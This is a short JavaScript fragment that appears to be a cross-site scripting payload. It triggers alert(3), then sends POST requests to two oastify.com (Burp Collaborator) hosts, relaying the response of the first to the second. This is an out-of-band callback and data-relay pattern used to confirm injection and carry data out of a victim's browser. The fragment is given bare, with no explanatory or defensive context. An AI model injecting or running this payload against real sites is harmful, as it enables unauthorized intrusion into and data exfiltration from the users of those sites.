alert(3),
fetch("https://rgb1o92umu8wcv8og2u2nyg7fylw9nxc.oastify.com/send/", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
  }),
})
  .then(response => response.text())
  .then(data => {
    fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  })
  .catch(error => console.error('Error:', error));
